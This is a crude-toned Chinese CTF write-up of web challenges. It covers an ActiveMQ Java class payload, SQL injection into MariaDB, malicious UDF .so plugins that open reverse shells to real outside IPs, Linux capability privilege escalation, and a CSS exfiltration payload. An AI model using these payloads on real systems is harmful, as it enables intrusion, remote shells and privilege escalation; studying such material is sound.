QAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;,&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw=|base64 -d &gt;/tmp/mlgb.txt&quot;]&#125;  然后 base64 编码，放入 oneway 的路径🤪 经调试，由于一次性不能写那么长的内容，只能曲线救国 分段写入 1 和 2, 然后合并写入 3, 再 base64 解码 (这 nm 是人能搞出来的操作？本来就恶心，还给👴使绊，差不多得了😅😓) 1&#123;&quot;lpcAllCom&quot;:[&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\\n&#x27;|tee /tmp/3&quot;,&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\\n&#x27;|tee /tmp/3&quot;]&#125; 1&#123;&quot;lpcAllCom&quot;:[&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;,&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;]&#125; 1eyJscGNBbGxDb20iOlsiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIiwiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIl19 解码，写出 Main.class java 运行🤔 1java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main 1&#123;&quot;lpcAllCom&quot;:[&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;,&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;]&#125; wcsndm, 本地环境 base64tmd 写不了文件😅,√Ⅷssrf 命令执行也尽恶心人，题目还不给编译，你 tmjava 不用编译是吧😓😅, 手 搓 class 文件是吧. 哦，源赖氏 java11 编译和运行一体化，一个 java 就能搞定，nmsl (那没事了)😊 之后调用 comsume 函数就行，由于 flag 已经写入队列了，读队列就行了.🤣 12345678910111213public static void main(String[] args) throws Exception &#123; Main main = new Main(); main.consume(); &#125;private void consume() throws Exception &#123; ConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://target:61616&quot;); Connection connection = factory.createConnection(); Session subSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = subSession.createQueue(&quot;flagqueue&quot;); MessageConsumer subscriber = subSession.createConsumer(queue); subscriber.setMessageListener(this); connection.start(); &#125; MessageConsumer subscriber = subSession.createConsumer(queue); ：使用 Session 创建一个 MessageConsumer 对象，该对象用于接收队列 flagqueue 上的消息。 一个德拉米，你设计牛魔的√Ⅷ 题呢，纯😅恶心人，复现都不让了👴安宁。还好👴是完美天才的 idol (暴论😡) 注意米线 ez_maria 好可爱的 lolita🥵🥵, 不知道 n1 都怎么忍住的，是我直接… 狠狠地把这题做出来，虽然也不一定能做出来就是了.😤 上来就告诉你有 SQL 的利用点，不多说，直接狠狠地搞点事. 二话不说，打个绞线 (读个 index.php) 1id=0 union select 1, load_file(&#x27;/var/www/html/index.php&#x27;) 源码分析 123456789101112131415161718192021&lt;?php//for n1ctf ezmariadb secret cmdif ($_REQUEST[&quot;secret&quot;] === &quot;lolita_love_you_forever&quot;)&#123; header(&quot;Content-Type: text/plain&quot;); echo &quot;\\\\n\\\\n`ps -ef` result\\\\n\\\\n&quot;; system(&quot;ps -ef&quot;); echo &quot;\\\\n\\\\n`ls -l /` result\\\\n\\\\n&quot;; system(&quot;ls -l /&quot;); echo &quot;\\\\n\\\\n`ls -l /var/www/html/` result\\\\n\\\\n&quot;; system(&quot;ls -l /var/www/html/&quot;); echo &quot;\\\\n\\\\n`find /mysql` result\\\\n\\\\n&quot;; system(&quot;find /mysql&quot;); die(&quot;can you get shell?&quot;);&#125;$servername = &quot;127.0.0.1&quot;;$username = &quot;root&quot;;$password = &quot;123456&quot;;$dbn = &quot;ctf&quot;; waf 123if (preg_match(&quot;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is&quot;, $_REQUEST[&quot;id&quot;]))&#123; die(&quot;你就不能绕一下喵&quot;);&#125; 可以看到当 secret=lolita_love_you_forever 时，会爆出一些信息. lolita 真的会爱我吗，我已经单身二十年甚至十九年，lolita 爱我的话，小🚹👩‍🦰也不是不行…(不行，👴永远喜欢栗山未来) 传参，获取一些有用的信息 1mariadbd --skip-grant-tables --secure-file-priv= --datadir=/mysql/data --plugin_dir=/mysql/plugin --user=mysql plugin 目录是 /mysql/plugin , secure-file-priv 是空的，这表示 MySQL 允许从任何位置读取数据文件。 ならば、答えはひとつだ.(bushi) 往 /mysql/plugin 目录写 so 打 udf😊, 虽然 function 被 ban, 但是我们还有 INSTALL UDF 写 so🤪 写法一: 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;__attribute__((constructor)) void init(int argc, char *argv[]) &#123; system(&quot;curl https://reverse-shell.sh/82.156.5.200:1034 | sh &amp;&quot;);&#125; 写法二：来自 Lolita 的❤ 1234567891011121314151617#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;void lshell()&#123; system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1 &amp;&#x27;&quot;);&#125;class LOLITA &#123;public: LOLITA()&#123; lshell(); &#125;&#125;;LOLITA lolita;LOLITA* _mysql_plugin_interface_version_ = &amp;lolita;//compile: g++ expso.cpp -shared -fPIC -o exp.so 以及来自 DJB 的 12345678// gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init()&#123; system(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1&#x27;&quot;);&#125; 1gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc -nostartfiles -nolibc 这两个选项比较高级，嵌入式系统常使用 写入 123456f = open(&quot;preaload.so&quot;, &#x27;rb&#x27;)xid = &quot;1; select unhex(&#x27;&quot; + &#x27;&#x27;.join([&#x27;%02X&#x27; % b for b in bytes(f.read())]) + &quot;&#x27;) into dumpfile &#x27;/mysql/plugin/lolita.so&#x27;;&quot;res = requests.post(url, data=&#123; &quot;id&quot;: xid&#125;)print(res.text) 或者 NESE 大爹的写法 11; select from_base64(&#x27;xx&#x27;) into dumpfile &#x27;/mysql/plugin/xxx.so&#x27;; % ：表示格式说明符的起始。 0 ：表示使用零来填充字段宽度，如果转换的值不足指定的宽度。 2 ：表示字段的最小宽度，即输出的字符串中至少会有两个字符。 X ：表示要将整数以十六进制形式输出，并且使用大写字母。 写进去还没完，由于没有 mysql 库，得先创造个 mysql 库，👴真是太菜了，👴要学！！！ 123CREATE DATABASE IF NOT EXISTS mysql;use mysql;CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT &#x27;&#x27; NOT NULL, dl varchar(128) DEFAULT &#x27;&#x27; NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=&#x27;MySQL plugins&#x27;; 121;create database mysql;create table mysql.plugin(name varchar(64), dl varchar(128));INSTALL PLUGIN testx SONAME &#x27;lolita.so&#x27;; CREATE TABLE IF NOT EXISTS plugin : 这部分开始了一个创建表的 SQL 语句。 IF NOT EXISTS 部分表示如果同名的表已经存在，就不再创建，以避免重复创建。 ( name varchar(64) DEFAULT '' NOT NULL, dl varchar(128) DEFAULT '' NOT NULL) : 这一部分定义了表的列。具体解释如下： name varchar(64) : 创建一个名为 “name” 的列，其数据类型为 VARCHAR，最大长度为 64 个字符。这个列存储插件的名称。 dl varchar(128) : 创建一个名为 “dl” 的列，其数据类型为 VARCHAR，最大长度为 128 个字符。这个列存储插件的下载链接。 DEFAULT '' : 这部分指定了如果没有提供值，这两个列的默认值是空字符串。 NOT NULL : 这部分指定了这两列是非空的，也就是说，插入数据时必须为它们提供值。 PRIMARY KEY (name) : 这一部分定义了一个主键约束。它指定 “name” 列作为主键，这意味着 “name” 列中的值必须是唯一的，用于唯一标识每个插件。 engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci : 这部分定义了表的引擎、事务性、字符集和排序规则。 engine=Aria : 表使用 Aria 存储引擎。 transactional=1 : 表被指定为事务性表。 CHARACTER SET utf8mb3 : 表的字符集被设置为 UTF-8 MB3。 COLLATE utf8mb3_general_ci : 表的排序规则被设置为 UTF-8 MB3 的通用不区分大小写排序规则。 comment='MySQL plugins' : 这一部分可以用于提供表的注释或描述。在这种情况下，表的注释是 “MySQL plugins”，以便更好地理解表的用途。 👴给你详细地介绍一下怎么个事，算是介绍一个建表模板了，避免以后建表出 bug. 接下来加载恶意 so 文件，弹 shell 成功 11;INSTALL PLUGIN lolita SONAME &#x27;lolita.so&#x27;; 然而这可并不是终点，阿米诺斯，flag 没权限读 1find / -exec getcap &#123;&#125; ; 2&gt;/dev/null 对每个文件运行 getcap 命令，以查看文件是否拥有 &quot;capabilities&quot; 属性。而 -exec 部分是用于执行这个检查的命令， &#123;&#125; 是占位符 getcap 是 Linux 命令行工具，用于检查和显示文件的 &quot;capabilities&quot;。它允许你查看与特定文件或可执行文件相关联的 &quot;capabilities&quot; 牛魔的什么事 capabilities 权限😓 linux setcap 命令详解 (包括各个 cap 的使用举例)_xiedy001 的博客 - CSDN 博客 Linux 提权之 Capabilities 提权（一） - FreeBuf 网络安全行业门户 来自 lolita 小改改 (bushi) 的❤ &quot;capabilities&quot; 权限是 Linux 内核引入的，用于精细划分超级用户权限的领域 说白了，root 被分权了，capabilities 继承一部分. CAP_NET_BIND_SERVICE ：允许绑定小于 1024 的网络端口。 CAP_SYS_ADMIN ：允许执行一些系统管理任务，如挂载文件系统。 CAP_DAC_OVERRIDE ：允许忽略文件的传统 Unix 权限。 CAP_SYS_PTRACE ：允许跟踪其他进程。 CAP_SETUID ：允许进程改变其有效用户 ID。 capability 名称 描述 CAPAUDITCONTROL 启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则 CAPAUDITREAD 允许通过 multicast netlink 套接字读取审计日志 CAPAUDITWRITE 将记录写入内核审计日志 CAPBLOCKSUSPEND 使用可以阻止系统挂起的特性 CAP_CHOWN 修改文件所有者的权限 CAPDACOVERRIDE 忽略文件的 DAC 访问限制 CAP_DAC_READ_SEARCH 忽略文件读及目录搜索的 DAC 访问限制 CAP_FOWNER 忽略文件属主 ID 必须和进程用户 ID 相匹配的限制 CAP_FSETID 允许设置文件的 setuid 位 CAPIPCLOCK 允许锁定共享内存片段 CAPIPCOWNER 忽略 IPC 所有权检查 CAP_KILL 允许对不属于自己的进程发送信号 CAP_LEASE 允许修改文件锁的 FL_LEASE 标志 CAPLINUXIMMUTABLE 允许修改文件的 IMMUTABLE 和 APPEND 属性标志 CAPMACADMIN 允许 MAC 配置或状态更改 CAPMACOVERRIDE 忽略文件的 DAC 访问限制 CAP_MKNOD 允许使用 mknod () 系统调用 CAPNETADMIN 允许执行网络管理任务 CAPNETBIND_SERVICE 允许绑定到小于 1024 的端口 CAPNETBROADCAST 允许网络广播和多播访问 CAPNETRAW 允许使用原始套接字 CAP_SETGID 允许改变进程的 GID CAP_SETFCAP 允许为文件设置任意的 capabilities CAP_SETPCAP 参考 capabilities man page CAP_SETUID 允许改变进程的 UID CAPSYSADMIN 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 CAPSYSBOOT 允许重新启动系统 CAPSYSCHROOT 允许使用 chroot () 系统调用 CAPSYSMODULE 允许插入和删除内核模块 CAPSYSNICE 允许提升优先级及设置其他进程的优先级 CAPSYSPACCT 允许执行进程的 BSD 式审计 CAPSYSPTRACE 允许跟踪任何进程 CAPSYSRAWIO 允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备 CAPSYSRESOURCE 忽略资源限制 CAPSYSTIME 允许改变系统时钟 CAPSYSTTY_CONFIG 允许配置 TTY 设备 CAP_SYSLOG 允许使用 syslog () 系统调用 CAPWAKEALARM 允许触发一些能唤醒系统的东西 (比如 CLOCKBOOTTIMEALARM 计时器) 设置与删除 Capabilities 12setcap cap_sys_admin+ep /usr/sbin/python #设置capabilities权限setcap -r /usr/sbin/python #移除capabilities权限 查找 Capabilities 的文件 12getcap -r / 2&gt;/dev/nullfind / -exec getcap &#123;&#125; ; 2&gt;/dev/null 这里 maraidb 有 cap_setfcap 的权限，允许为文件设置任意的 capabilities. 其一 写个 readflag 12345678910111213141516#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;// gcc readflag.c -o readflagint main() &#123; char *buffer[1024]; setuid(0); FILE* f = fopen(&quot;/flag&quot;, &quot;r&quot;); fread(buffer, 1024, 1, f); fclose(f); printf(&quot;%s\\n&quot;, buffer);&#125; 万能的 base64 写一切 再写一个调用 cap_set_file 给 readflag 挂上 cap_setuid=ep 之后用 mariadb 加载恶意 so, mariadb –plugin-dir=/mysql/plugin/ –default-auth=setcap 123456789101112131415#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;sys/capability.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;// setcap cap_setuid+ep readflag// /usr/bin/mariadb cap_setfcap=ep// gcc -fPIC -shared setcap.c -o setcap.so -lcap__attribute__ ((__constructor__)) void test (void)&#123; cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;); cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap);&#125; cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;); ：这行代码使用 cap_from_text 函数创建一个能力集（capability set）。在 Linux 中，能力集是一种安全机制，用于管理进程对系统资源和操作的访问权限。 cap_setuid+ep 表示启用 &quot;设置用户标识&quot;（ cap_setuid ）和 &quot;提升特权&quot;（ ep ，意味着效果持久），这意味着程序将具有提升权限的能力. 人言：获取 cap_setuid 这种 cap, 然后给 readflag 赋上 cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap); ：给 readflag 上权限 编译 1gcc -fPIC -shared setcap.c -o setcap.so -lcap -lcap 是编译 C/C++ 程序时传递给编译器的选项之一，用于指定链接到 Linux 能力库，一些常见的能力库函数包括 cap_from_text 和 cap_set_file 在这里面 rnm, 编译不出来，本地编译吧。报错:fatal error: sys/capability.h 1sudo apt-get install libcap-dev 解决一下 1mariadb –-plugin-dir=/tmp –-default-auth=cap &amp; 其二 123456789101112131415161718192021222324252627#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/capability.h&gt;void lshell()&#123; cap_t caps = cap_from_text(&quot;cap_dac_override=eip&quot;); cap_set_file(&quot;/bin/cat&quot;, caps); printf(&quot;setcap finished\\n&quot;);&#125;class LOLITA &#123;public: LOLITA()&#123; lshell(); &#125;&#125;;LOLITA _mysql_client_plugin_declaration_;//compile: g++ evil.c -shared -fPIC -o cap.so -lcap2```将编译出来的文件传到靶机（dd &lt; /dev/tcp/ip/port &gt; cap.so） 加载这个so让/bin/cat获取cap_dac_override（忽略文件权限）的特权 ```mariadb --plugin-dir=. --default-auth=capcat /flag``` 劫持 php 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;dlfcn.h&gt;// #include &lt;sys/capability.h&gt;typedef void* cap_t;typedef cap_t (*cap_from_text_t)(const char *);typedef int (*cap_set_file_t)(const char *, cap_t);__attribute__((constructor)) void init(int argc, char *argv[]) &#123; printf(&quot;cap.c: init()\\n&quot;); void *handle = dlopen (&quot;/lib/x86_64-linux-gnu/libcap.so.2&quot;, RTLD_LAZY); cap_from_text_t cap_from_text = (cap_from_text_t)dlsym(handle, &quot;cap_from_text&quot;); cap_set_file_t cap_set_file = (cap_set_file_t)dlsym(handle, &quot;cap_set_file&quot;); cap_set_file(&quot;/usr/local/bin/php&quot;, cap_from_text(&quot;cap_setuid+ep&quot;));&#125; 更吊的 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/capability.h&gt;void _init()&#123; cap_t caps = cap_init(); if (caps == NULL) &#123; perror(&quot;cap_init&quot;); exit(EXIT_FAILURE); &#125; cap_value_t cap_list[4]; //cap_list[0] = CAP_SYS_ADMIN; cap_list[0] = CAP_SETFCAP; cap_list[1] = CAP_CHOWN; cap_list[2] = CAP_SETUID; cap_list[3] = CAP_SETGID; if (cap_set_flag(caps, CAP_EFFECTIVE, 4, cap_list, CAP_SET) == -1 || cap_set_flag(caps, CAP_INHERITABLE, 4, cap_list, CAP_SET) == -1 || cap_set_flag(caps, CAP_PERMITTED, 4, cap_list, CAP_SET) == -1) &#123; perror(&quot;cap_set_flag&quot;); cap_free(caps); exit(EXIT_FAILURE); &#125; const char *filename = &quot;/tmp/perl&quot;; if (cap_set_file(filename, caps) == -1) &#123; perror(&quot;cap_set_file&quot;); cap_free(caps); exit(EXIT_FAILURE); &#125; cap_free(caps);&#125; md😡其它几家的反弹 shellpayload 有问题，反弹 shell 了以后就一直连不上 mariadb 了，最后还是用了 lolita 的 exp 打，一遍过，果然 lolita 还是爱我的🥰🥰🥰. 这种终出的感觉谁懂啊，好√Ⅷ 舒服啊，√Ⅷ 好舒服啊. ytiruces 👴不想复现，环境不好搞，👴贴个 exp 在这 12345678910111213141516171819202122232425262728import stringimport socketpayload = &#x27;https://ytiruces.ctfpunk.com/?content=%3Cp%3E%3Cstyle%3E#style#%3C/style%3E%3Cvideo%20controls%20playsinline%20autoplay%20muted%20loop%3E%3Csource%20src=%22https://n1s.ctf.hurrison.com/test.webm%22%3E%3Ctrack%20src=%22/flag?name=WEBVTT%250a00:00.000--%3E00:13.000%250a%3Cv%22%20default%3E&#x27;flag = &#x27;n1ctf&#123;I&#x27;style = &#x27;::cue(v[voice^=%22&#x27; + flag + &#x27;#x#%22])%20&#123;%20background:%20url(https://n1.ctf.hurrison.com/?f=#x#);%20&#125;%0a&#x27;s = &#x27;&#x27;table = string.ascii_letters + &#x27;&#123;&#x27; + &#x27;&#125;&#x27;for x in table: s += style.replace(&#x27;#x#&#x27;, x)payload = payload.replace(&#x27;#style#&#x27;, s)print(payload)ip = &#x27;119.28.143.13&#x27;port = 32890s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip, port))d = s.recv(256)print(d)s.send(payload.encode()) ggbond’s gogs 👴真不是懒，没环境复现个钩子，tmd 当👴⭐😡吧. dockerdebug 123456789#FROM openjdk:8-alpineFROM adoptopenjdk/openjdk11COPY SimpleAPI-1.0-SNAPSHOT.jar /tmp/web.jarCOPY flag /flagCOPY start.sh /start.shRUN chmod +x /start.shENTRYPOINT /start.sh EXPOSE 8877EXPOSE 3345 12345touch /tmp/app.logchmod 666 /tmp/app.lognohup java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:3345 -jar /tmp/web.jar &gt;/tmp/app.log 1docker run -d -p 8877:8877 -p 63342:63342 remote_debug 运行远程连接 debug 专用的端口","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]},{"title":"DAS0RAYSXCBCTF","slug":"DAS0RAYSXCBCTF","date":"2023-11-30T08:12:36.000Z","updated":"2023-11-30T13:36:00.110Z","comments":true,"path":"2023/11/30/DAS0RAYSXCBCTF/","link":"","permalink":"https://1llustrious.github.io/2023/11/30/DAS0RAYSXCBCTF/","excerpt":"","text":"DAS0RAYSxCBCTF 写在前面 yet another box Stack trace API Shadow-Realm-API dynamic import 方案 exp nps 开打😓 remote 干🤪 忆！悟！这就是 xss 的机器人创造 exp Deserialize?Upload! actuator😫 题目实践😓😡 反序列化分析😛 文件上传 + 反序列化组合拳😤 DASCTFXCBCTF_2023_bypassJava Content-Length 限制 chuncked 编码怎么发 不稳定 jackson 链问题 流程 为什么顺序不一定 解决方法😊 实现 构造 内存🐎的使用🥵👴 列目录 读文件 RASP😅😡 啥事 RASP 解决方案😒 JNI 规范 DAS0RAYSxCBCTF 写在前面 wcsnmd, 谁给👴出的这么恶心的 web,nmd 爆零了，tmd 总共 3100 的解，什么√⑧玩意儿. wp:‌‍ ⁡ ⁣‌‍ ‍⁣⁢⁢ ‌‍‬ ⁣ ‌⁣⁢‌⁡⁤⁢⁤⁤‌‌⁡⁢‌‍ ⁣‌‌⁡⁣ DASCTF x CBCTF - 飞书云文档 (feishu.cn) DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top) yet another box 这题是一个比较新的沙箱 shadowrealm , 这 byd 和 node 的 vm8 太一样，有着自己的全局对象和内置函数，就挺抽象，没法像 vm , 也无法通过 prototype pollution 控制主模块中的内置属性另外由于与 package.json 声明了 “type”:“module” 且文件结尾为 .mjs，所采用的 ESM 默认 strict mode，无法通过 [stack-trace-api](Stack trace API・V8 — 堆栈跟踪 API・V8 发动机) 跨上下文取得可利用对象。 Stack trace API 仅作为学习记录使用，并不为本题提供思路. 默认情况下，V8 抛出的几乎所有错误都有一个属性，抛出错误的时候会用到方法，该方法能获得到外面的全局对象. Shadow-Realm-API Wrapped Function Exotic Objects 是一种奇异对象，内含一个回调函数。具有一些内置槽 slot ,: Internal slots Type Description [[WrappedTargetFunction]] Callable Object Stores the callable object. 